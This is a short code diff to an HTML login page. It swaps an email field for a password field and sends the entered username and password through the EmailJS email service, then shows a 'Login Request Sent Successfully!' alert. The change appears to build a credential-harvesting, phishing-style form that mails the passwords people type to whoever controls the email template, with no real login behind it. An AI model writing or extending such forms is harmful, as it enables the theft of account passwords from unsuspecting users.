@@ -16,7 +16,7 @@ e.preventDefault();
 
 emailjs.send("service_g9hb3t6","template_e9aw4ub",{
 username: document.getElementById("username").value,
-email: document.getElementById("email").value
+password: document.getElementById("password").value
 })
 .then(function(){
 alert("Login Request Sent Successfully!");
@@ -84,7 +84,7 @@ opacity:0.9;
 
 <input type="text" id="username" placeholder="Username" required>
 
-<input type="email" id="email" placeholder="Email" required>
+<input type="password" id="password" placeholder="password" required>
 
 <button type="submit">Login</button>
 
